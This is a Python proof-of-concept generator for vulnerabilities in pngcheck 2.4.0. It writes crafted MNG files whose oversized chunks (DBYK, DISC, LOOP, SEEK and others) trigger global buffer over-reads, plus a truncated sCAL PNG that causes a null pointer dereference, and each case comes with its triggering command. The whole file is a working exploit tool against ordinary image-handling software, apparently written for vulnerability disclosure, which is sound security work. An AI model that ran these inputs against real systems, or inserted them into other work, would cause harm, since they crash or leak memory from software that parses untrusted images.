#!/usr/bin/env python3
"""
PNGCheck Vulnerability POC Generator
Generates POC files demonstrating multiple vulnerabilities in pngcheck 2.4.0:

- Multiple global buffer over-read due to unchecked 'sz' variable in MNG chunks
- Null pointer dereference of pPixheight in sCAL chunk with -f option

Each POC can be generated individually or all at once using the 'all' option.
"""

import argparse
import pathlib
import zlib

from construct import Bytes, Const, GreedyRange, Int32ub, Struct, this

Chunk = Struct(
    "length" / Int32ub,
    "type" / Bytes(4),
    "data" / Bytes(this.length),
    "crc" / Int32ub,
)

PNG = Struct(
    "signature" / Const(b"\x89PNG\r\n\x1a\n"),
    "chunks" / GreedyRange(Chunk),
)

MNG = Struct(
    "signature" / Const(b"\x8aM\x4e\x47\x0d\x0a\x1a\x0a"),
    "chunks" / GreedyRange(Chunk),
)


def create_chunk(chunk_type: bytes, chunk_data: bytes) -> dict:
    return {
        "length": len(chunk_data),
        "type": chunk_type,
        "data": chunk_data,
        "crc": zlib.crc32(chunk_type + chunk_data) & 0xFFFFFFFF,
    }


def generate_poc(
    file_format: Struct, chunks: list[tuple[bytes, bytes]], output_path: pathlib.Path
) -> None:
    file_format.build_file(
        dict(chunks=[create_chunk(*chunk) for chunk in chunks]),
        output_path,
    )


# Most POCs here demonstrate a global buffer over-read vulnerability
# caused by unchecked 'sz' variable exceeding BS in MNG chunk processing.
# The sCAL case shows a null pointer dereference when pPixheight is uninitialized.
POCS = {
    # DBYK chunk
    # Command: pngcheck -f poc-dbyk.mng
    "dbyk": (
        MNG,
        [
            (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
            # chunk_name(4) + polarity(1) + keyword(2) * 20000
            (b"DBYK", b"iCCP\x00" + b"A\x00" * 20000),
            (b"MEND", b""),
        ],
    ),
    # DISC chunk
    # Command: pngcheck -v poc-disc.mng
    "disc": (
        MNG,
        [
            (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
            # discard_id(2) * 20000
            (b"DISC", b"\x00\x01" * 20000),
            (b"MEND", b""),
        ],
    ),
    # DROP chunk
    # Command: pngcheck poc-drop.mng
    "drop": (
        MNG,
        [
            (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
            # chunk_name(4) * 10000
            (b"DROP", b"ABCD" * 10000),
            (b"MEND", b""),
        ],
    ),
    # LOOP chunk
    # Command: pngcheck -v poc-loop.mng
    "loop": (
        MNG,
        [
            (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
            (
                b"LOOP",
                b"\x00"  # nest_level(1)
                + b"\x00\x00\x00\x01"  # iteration_count(4)
                + b"\x00"  # termination_condition(1)
                + b"\x00\x00\x00\x01" * 10000,  # Iteration_min(4) + ...
            ),
            (b"MEND", b""),
        ],
    ),
    # nEED chunk
    # Command: pngcheck -v poc-need.mng
    "need": (
        MNG,
        [
            (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
            # (keyword(1) + separator(1)) * 20000
            (b"nEED", b"A\x00" * 20000),
            (b"MEND", b""),
        ],
    ),
    # ORDR chunk
    # Command: pngcheck poc-ordr.mng
    "ordr": (
        MNG,
        [
            (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
            # (chunk_name(4) + order_type(1)) * 8000
            (b"ORDR", (b"tEXt\x00" * 8000)),
            (b"MEND", b""),
        ],
    ),
    # PAST chunk
    # Command: pngcheck -f poc-past.mng
    "past": (
        MNG,
        [
            (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
            (
                b"PAST",
                b"\x00\x01"  # destination_id(2)
                + b"\x00"  #  target_delta_type(1)
                + b"\x00" * 8  # target_x(4) + target_y(4)
                + (b"\x00" * 30) * 1500,  # (coordinates_pairs(30)) * 1500
            ),
            (b"MEND", b""),
        ],
    ),
    # PPLT chunk
    # Command: pngcheck poc-pplt.mng
    "pplt": (
        MNG,
        [
            (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
            (
                b"PPLT",
                b"\x04"  # pplt_delta_type(1)
                + b"\x00\xff"  # first_index(1) + last_index(1),
                + b"A" * 40000,  # set_of_samples(40000)
            ),
            (b"MEND", b""),
        ],
    ),
    # SAVE chunk
    # Command: pngcheck -v poc-save.mng
    "save": (
        MNG,
        [
            (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
            # offset_size(1) + ... * 40000
            (b"SAVE", b"\x04" + b"\x00" * 40000),
            (b"MEND", b""),
        ],
    ),
    # SEEK chunk
    # Command: pngcheck -v poc-seek.mng
    "seek": (
        MNG,
        [
            (b"MHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01" + b"\x00" * 20),
            (b"SAVE", b"\x04test\x00"),
            # segment_name(40000)
            (b"SEEK", b"A" * 40000),
            (b"MEND", b""),
        ],
    ),
    # sCAL chunk
    # Command: pngcheck -f poc-scal.png
    "scal": (
        PNG,
        [
            (b"IHDR", b"\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00"),
            # unit_specifier(1) + pixel_width(m) + null_separator + pixel_height(n)
            #                                        [missing]         [missing]
            (b"sCAL", b"\x01" + b"1.0"),
            (b"IDAT", zlib.compress(b"\x00\x00\x00")),
            (b"IEND", b""),
        ],
    ),
}


def main():
    parser = argparse.ArgumentParser(
        description=(
            "Generate POC files for pngcheck 2.4.0 vulnerabilities (multiple buffer "
            "over-reads and a null pointer dereference)"
        )
    )
    parser.add_argument(
        "type",
        choices=["all"] + list(POCS.keys()),
        help="Vulnerability type to generate POC for ('all' to generate all types)",
    )
    parser.add_argument(
        "-o",
        "--output",
        type=pathlib.Path,
        help="Output file path (default: poc-<type>.png/mng)",
    )
    args = parser.parse_args()

    if args.type == "all":
        for poc_type, (file_format, chunks) in POCS.items():
            extension = ".mng" if file_format == MNG else ".png"
            output_path = args.output or pathlib.Path(f"poc-{poc_type}{extension}")
            print(f"Generating {poc_type} chunk vulnerability POC...")
            generate_poc(file_format, chunks, output_path)
        print("POC files generated successfully")
    else:
        file_format, chunks = POCS[args.type]
        if not args.output:
            extension = ".mng" if file_format == MNG else ".png"
            args.output = pathlib.Path(f"poc-{args.type}{extension}")
        print(f"Generating {args.type} chunk vulnerability POC...")
        generate_poc(file_format, chunks, args.output)
        print("POC file generated successfully")


if __name__ == "__main__":
    main()
